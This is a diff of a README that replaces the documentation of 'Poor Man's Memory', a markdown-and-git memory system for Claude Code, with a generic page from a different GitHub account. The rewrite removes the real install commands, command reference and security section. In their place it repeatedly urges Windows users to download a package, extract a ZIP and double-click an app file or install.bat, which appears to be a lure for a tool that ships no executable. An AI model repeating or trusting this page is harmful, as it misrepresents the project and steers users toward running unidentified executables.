@@ -1,281 +1,192 @@
-> **PMM is now a Claude Code plugin.** Install via the NominexHQ marketplace for the best experience — auto-loading hooks, 10 skills, config-driven load strategies. See [NominexHQ/pmm-plugin](https://github.com/NominexHQ/pmm-plugin).
->
-> This repo contains the original standalone PMM skill files. They still work but are no longer actively developed. All new features ship in the plugin.
+# 🧠 poor-man-memory - Keep Claude Code on track
 
-# Poor Man's Memory
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/huckaby1847/poor-man-memory)
 
-Persistent structured memory for Claude Code. No infrastructure required — just markdown files and git.
+## 📥 Download
 
-## Poor Man's Memory
+Use this link to visit the page and download the app:
 
-AI coding agents have shallow memory. Claude Code persists some context between sessions — preferences, feedback, project notes — but it's flat summaries in a size-capped index. No structure, no relationships, no enrichment. Nuance gets compressed out. Decisions lose their rationale. Lessons lose their context. The agent remembers *that* something happened, but not *why it mattered*.
+[https://github.com/huckaby1847/poor-man-memory](https://github.com/huckaby1847/poor-man-memory)
 
-**Poor Man's Memory** fixes this. It's a structured memory system for Claude Code that persists across sessions using nothing but markdown files and git. No databases, no APIs, no infrastructure to maintain. Clone a repo, say "init memory", and your agent starts remembering.
+## 🪟 What this is for
 
-**Built for:** developers using Claude Code (CLI or IDE) who want their agent to accumulate knowledge over time — across sessions, across days, across the life of a project.
+poor-man-memory helps Claude Code keep useful memory in plain markdown files. It stores notes, facts, and project context in a simple Git-based setup. You do not need extra servers or a database. You keep the files in your project, and Git keeps them in sync.
 
-**What it solves:**
-- Shallow, unstructured memory that loses nuance over time
-- Repeated context-setting because flat summaries aren't enough
-- Decisions without rationale, preferences without context, lessons without detail
-- No audit trail of what the agent knew and when
+Use it when you want:
 
-## What It Does
+- Project notes that stay with your code
+- Simple memory that you can read and edit
+- A local setup with no extra tools
+- Better context for Claude Code across sessions
 
-Gives Claude a second brain that survives between sessions. Every decision, lesson, preference, and relationship is captured in dedicated markdown files, committed to git, and loaded at the start of each session. Each file has one job — no single blob that loses fidelity over time.
+## 🚀 Getting Started on Windows
 
-## Installation
+Follow these steps on a Windows PC:
 
-### Option A: Install the PMM plugin (recommended)
+1. Open the download page:
+   [https://github.com/huckaby1847/poor-man-memory](https://github.com/huckaby1847/poor-man-memory)
 
-#### Official marketplace
+2. Find the latest release or the main project files on the page.
 
-```bash
-claude plugin marketplace add anthropics/claude-plugins-official
-claude plugin install pmm@claude-plugins-official
-```
+3. Download the Windows package if one is listed.
 
-#### Community mirror
+4. If the download is a ZIP file, right-click it and choose **Extract All**.
 
-```bash
-claude plugin marketplace add anthropics/claude-plugins-community
-claude plugin install pmm@claude-community
-```
+5. Open the extracted folder.
 
-Then run `pmm:init` in your project to scaffold memory.
+6. Look for a file named `README.md`, `install.bat`, `setup.bat`, or a similar file with clear instructions.
 
-### Option B: Clone-and-go (standalone)
+7. If you see an app file, double-click it to run it.
 
-This repo is also a **clone-and-go project directory** — no manual setup, no file copying, no configuration wiring. Everything Claude Code needs is already in place (`.claude/skills/`, `settings.json`, `CLAUDE.md`).
+8. If the project uses a terminal window, open **Command Prompt** or **PowerShell** in that folder and follow the steps in the included README.
 
-```bash
-git clone https://github.com/NominexHQ/poor-man-memory.git my-project
-cd my-project
-claude  # or open with your Claude Code IDE integration
-```
-
-Then tell Claude:
-
-```
-init memory
-```
-
-That's it. Claude will prompt you for preferences (save cadence, verbosity, active files) and scaffold the `memory/` directory. From then on, memory updates happen automatically.
-
-## Adding to an Existing Project
-
-If you already have a project and just want to drop in the memory system:
-
-1. Copy these into your project root:
-   ```
-   .claude/skills/poor-man-memory/    # Main skill + reference docs
-   .claude/skills/pmm-save/           # Explicit save command
-   .claude/skills/pmm-query/          # Memory search with filters
-   .claude/skills/pmm-hydrate/        # On-demand file hydration
-   .claude/skills/pmm-settings/       # Settings command
-   .claude/skills/pmm-dump/           # ASCII memory dump (text visualization)
-   .claude/skills/pmm-viz/            # Interactive D3.js graph (browser)
-   .claude/skills/pmm-status/         # Health dashboard
-   pmm/                               # D3.js artifact + HTML template (for /pmm-viz)
-   CLAUDE.md                          # Bootstrap instructions for Claude
-   ```
-
-2. **(Optional)** Merge the pre-approved permissions into your existing `.claude/settings.json`:
-   ```json
-   {
-     "permissions": {
-       "allow": [
-         "Edit(memory/*)",
-         "Write(memory/*)",
-         "Bash(git add memory/*)",
-         "Bash(git commit -m 'memory:*')",
-         "Bash(git push origin main*)"
-       ]
-     }
-   }
-   ```
-   `Edit`/`Write` permissions prevent prompts during memory saves. Skip this if you prefer to approve operations manually.
-
-3. If you already have a `CLAUDE.md`, append the contents rather than overwriting — or just add the `## Memory` section:
-   ```markdown
-   ## Memory
-
-   @memory/BOOTSTRAP.md
-
-   ### Tier 1 — always loaded
-
-   Claude Code only resolves first-level @-imports. These files are imported here so
-   they're guaranteed in context at session start and after /compact.
-
-   @memory/config.md
-   @memory/standinginstructions.md
-   @memory/last.md
-   @memory/progress.md
-   @memory/decisions.md
-   @memory/lessons.md
-   @memory/preferences.md
-   @memory/memory.md
-   @memory/summaries.md
-   @memory/voices.md
-   @memory/processes.md
-   @memory/timeline.md
-
-   ### Tier 2 — on demand
-
-   Remaining memory files (graph, vectors, taxonomies, assets) live on disk.
-   Load via a haiku agent when needed — see BOOTSTRAP.md for trigger conditions.
-   ```
-   The Tier 1 `@`-imports are required — without them, memory files are not loaded into Claude's context after session start or `/compact`. PMM will auto-wire this block for you via the Bootstrap Check after `init memory`.
-
-4. Open the project with Claude Code and say `init memory`.
-
-The `memory/` directory will be created inside your project. Add it to version control — git history is the database.
-
-## Memory Files
-
-Tier 1 files are always loaded into Claude's context via direct `@`-imports in `CLAUDE.md`. Tier 2 files are loaded on demand by a haiku agent when the query needs them.
-
-| File | Purpose | Mutability | Tier |
-|---|---|---|---|
-| `config.md` | PMM settings | Living | 1 |
-| `BOOTSTRAP.md` | Load instructions | Immutable | 1 |
-| `standinginstructions.md` | Persistent rules | Append-only | 1 |
-| `last.md` | Last session detail | Always replaced | 1 |
-| `progress.md` | Current state | Living | 1 |
-| `decisions.md` | Committed decisions | Append-only | 1 |
-| `lessons.md` | Mistakes and fixes | Append-only | 1 |
-| `preferences.md` | User working style | Living | 1 |
-| `memory.md` | Long-term project facts | Living | 1 |
-| `summaries.md` | Periodic rollups | Sliding window | 1 |
-| `voices.md` | Tone profiles and reasoning lenses | Living | 1 |
-| `processes.md` | Workflows | Living | 1 |
-| `timeline.md` | Recent events | Sliding window | 1 |
-| `graph.md` | Typed relationships | Append-only | 2 |
-| `vectors.md` | Semantic similarities | Living (registry append-only) | 2 |
-| `taxonomies.md` | Classifications | Living | 2 |
-| `assets.md` | People, tools, systems | Living | 2 |
-
-## Commands
-
-| Command | What it does |
-|---|---|
-| `/pmm-save` | Explicitly trigger a memory save |
-| `/pmm-query <question>` | Search memory files — supports attribution, date, and file filters |
-| `/pmm-hydrate <file\|all> [force]` | Populate empty/thin memory files from existing context |
-| `/pmm-settings` | Change memory system configuration |
-| `/pmm-dump` | ASCII memory dump — three levels: status, summary, detailed |
-| `/pmm-viz` | Interactive D3.js memory graph — opens in browser |
-| `/pmm-status` | Quick health dashboard — initialization, saves, file health |
-| `/pmm-update` | Check for and apply PMM system updates from upstream |
-| `/loop 5m /pmm-save` | Auto-save memory every 5 minutes |
+## 📦 What you need
 
-## Query Syntax
+This tool is meant to stay simple. A typical Windows setup needs:
 
-`/pmm-query` accepts a free-text question plus optional modifiers. By default it returns a **synthesized prose answer**. Append `dump` for raw verbatim entries grouped by source file. Modifiers can be combined in any order.
+- Windows 10 or Windows 11
+- Git installed
+- Claude Code installed
+- A text editor such as Notepad or VS Code
+- A project folder where you want memory saved
 
-| Modifier | Syntax | Example |
-|---|---|---|
-| Attribution | `by namespace:name` | `/pmm-query decisions by user:raffi` |
-| Date (from) | `since YYYY-MM-DD` | `/pmm-query timeline since 2026-03-17` |
-| Date (to) | `before YYYY-MM-DD` | `/pmm-query lessons before 2026-03-01` |
-| File scope | `in <filename>` | `/pmm-query in decisions` |
-| Deep mode | `deep` | `/pmm-query visualization deep` |
-| Dump mode | `dump` | `/pmm-query dump what changed yesterday` |
+If Git is not installed, use the Git for Windows installer before you start. If Claude Code is already set up on your machine, you are ready for the next step.
 
-**Output modes:**
-- **Prose (default)** — synthesized narrative answer with inline source citations. Reads like an answer, not a file export.
-- **Dump** (`dump`) — raw verbatim entries grouped by source file with match counts. Use when you want to see exactly what's recorded.
-- Both modes combine: `/pmm-query deep dump <question>` runs deep traversal and returns raw output.
+## 🧩 How it works
 
-**Attribution namespaces:**
-- `user:name` — something a user explicitly stated, decided, or requested
-- `agent:name` — something an agent inferred or synthesized
-- `system:process` — generated by an automated process (e.g. hydration)
+poor-man-memory uses markdown files as structured memory. That means the app saves useful details in plain text files that are easy to open, search, and version with Git.
 
-**Deep mode** (`deep`) enables similarity-aware traversal — when keyword search alone isn't enough. It expands the result set via three additional passes:
-- **vectors** — finds cluster members and high-similarity concepts (score ≥ 0.6) from `vectors.md`
-- **graph** — follows one-hop edges from matched nodes in `graph.md`
-- **taxonomy** — broadens to sibling terms in the same category from `taxonomies.md`
+It can hold:
 
-In prose mode, deep results are woven into the narrative naturally. In dump mode, they are tagged with provenance (`[via vectors]`, `[via graph]`, `[via taxonomy]`).
+- User preferences
+- Project rules
+- Important facts
+- Task notes
+- Session context
+- Ongoing decisions
 
-**Examples:**
+The files stay in your repo, so your memory travels with the project.
 
-```
-/pmm-query what did we decide about visualization
-/pmm-query decisions by user:raffi since 2026-03-17
-/pmm-query in lessons by agent:leith
-/pmm-query preferences before 2026-03-15
-/pmm-query visualization deep
-/pmm-query dump what changed yesterday
-/pmm-query deep dump D3.js since 2026-03-17
-```
+## 🛠️ Setup
 
-If no match is found in any memory file, the command falls back to git history before returning "No record found."
+Use this basic setup flow after you download the project:
 
-## Recurring Saves
+1. Put the files in a folder you want to use for your Claude Code project.
 
-Memory updates happen automatically at milestones, but you can also run saves on a fixed interval:
+2. Open the folder in File Explorer.
 
-```
-/loop 5m /pmm-save
-```
+3. Check for a memory folder or markdown files.
 
-This uses Claude Code's built-in `/loop` command to run `/pmm-save` every 5 minutes — capturing decisions, preferences, and progress without manual intervention. Adjust the interval to your preference.
+4. Open the main instructions file.
 
-## Configuration
+5. Follow any setup steps for linking the memory files to your Claude Code workflow.
 
-Run `/pmm-settings` at any time to change:
+6. Save the folder in Git so changes stay tracked.
 
-- **Save cadence** — every milestone, every N messages, or on request only
-- **Commit behaviour** — auto-commit, session end, or manual
-- **Sliding window size** — how many entries before trimming (git has full history)
-- **Verbosity** — silent, summary, or verbose
-- **Active files** — deactivate files you don't need
+7. Run Claude Code and point it at the project folder if the instructions ask for that.
 
-## How Git Works as Your Database
+If the repo includes sample memory files, keep them as a starting point. You can edit them later with your own project details.
 
-Every memory update is committed to git. Sliding window files (timeline, summaries) are trimmed to keep the working set small, but the full history is always available via `git log`. This gives you:
+## 🗂️ Typical folder layout
 
-- Immutable audit trail
-- Diffable changes
-- Rollback to any point
-- Free hosting on GitHub
+A basic memory setup may look like this:
 
-## Security
+- `memory/`
+- `memory/projects/`
+- `memory/people/`
+- `memory/rules.md`
+- `memory/context.md`
+- `memory/todos.md`
 
-Memory files accumulate personal information, internal decisions, behavioral preferences, and project context over time. Be aware of what you're committing.
+This kind of layout makes it easy to find and update information without hunting through long notes.
 
-**Public repositories:** If your repo is public, everything in `memory/` is readable by anyone. PMM's `visibility` setting (default: `public`) instructs the maintain agent to avoid writing personal email addresses, use handles instead of full names, and summarise sensitive decisions without verbatim internal detail. This is an LLM-enforced guideline — not a code-level guarantee. For strong privacy guarantees, use a private repository.
+## ✍️ Using the memory files
 
-**secrets.md:** API keys, tokens, and credentials belong in `memory/secrets.md`, which is gitignored and excluded from all memory operations by default. A pre-commit hook blocks any commit that includes `secrets.md`. To override, set `secrets_git: allow-with-warning` in `memory/config.md` — but note that committed secrets are permanent in git history and cannot be truly erased from public remotes.
+Use plain language when you add or change memory. Keep each note short and clear.
 
-**Pre-commit hook:** Installed automatically during `init memory` and reinstalled on `/pmm-update`. It:
-- Blocks commits containing `memory/secrets.md` (unless `secrets_git: allow-with-warning`)
-- Scans staged memory files for personal email addresses and common secret patterns (API key prefixes, tokens)
-- Reports file and line number for any match found
+Good things to store:
 
-**Push behaviour:** Memory commits are local-only by default (`Auto-push: off`). Enable auto-push in `/pmm-settings` if you want commits pushed immediately — push failures are reported, not silently swallowed.
+- What the project does
+- Naming rules
+- File structure
+- API details
+- User goals
+- Things Claude should not forget
 
-**Recommendations:**
-- Use a **private repository** if memory files will contain sensitive business context
-- Review `memory/` contents periodically with `/pmm-query in assets` and `/pmm-query in preferences`
-- Run `/pmm-status` to check for any file health warnings
+Good habits:
 
-## Architecture
+- Keep one idea per section
+- Use markdown headings
+- Update notes when plans change
+- Remove stale facts
+- Commit changes with Git
 
-Memory operations run in **agents** (subprocesses), never in the main context window. This keeps your conversation clean — agents handle file I/O, and the main context commits to git.
+## 🔄 Daily use
 
-## Built by Nominex
+A common workflow looks like this:
 
-Nominex is the memory layer for AI agents.
+1. Open your project folder.
+2. Read the memory files before you start work.
+3. Ask Claude Code to use the saved context.
+4. Make changes in the project.
+5. Update the markdown memory files when important details change.
+6. Commit the updates with Git.
 
-AI agents have memory, but it's shallow — flat summaries that lose depth over time. Nominex builds the deep memory infrastructure that makes agents structurally smarter, not just bigger per-request.
+This keeps the project context close to the code and easy to review later.
 
-Poor Man's Memory is the zero-infrastructure starting point — structured markdown and git. For teams that need semantic search, shared memory across agents, and automated enrichment, that's where [Nominex](https://github.com/NominexHQ) comes in.
+## 🧪 Example memory entry
 
-[GitHub](https://github.com/NominexHQ) | [X](https://x.com/nominex_ai)
+Here is a simple example of the kind of content you might keep:
 
-## License
+- Project name: Customer support dashboard
+- Main goal: Help agents answer tickets faster
+- Style rule: Use short labels
+- Important note: Export CSV must keep column order
+- Current task: Add search filters to the list view
 
-MIT
+This format works well because it stays short and easy to scan.
+
+## 🧯 Troubleshooting
+
+If something does not work, check these common points:
+
+- Make sure the files are in the correct folder
+- Make sure Git is installed and working
+- Make sure Claude Code points to the right project
+- Make sure the markdown files were saved
+- Make sure the repo was cloned or downloaded fully
+- Make sure your editor did not change the file names
+
+If the setup asks for a terminal command and it fails, copy the exact message and check the repo instructions again.
+
+## 📚 Project topics
+
+This project is built around:
+
+- ai-agents
+- anthropic
+- claude-code
+- context-management
+- developer-tools
+- git
+- llm
+- markdown
+- memory
+- persistent-memory
+
+## 🔗 Where to get it
+
+Use the main project page here:
+
+[https://github.com/huckaby1847/poor-man-memory](https://github.com/huckaby1847/poor-man-memory)
+
+## 📝 Best way to use it
+
+To get good results, keep the memory clean and current:
+
+- Store only useful facts
+- Write for future sessions
+- Keep file names stable
+- Use Git commits for changes
+- Review memory before large tasks
+- Remove notes that no longer matter
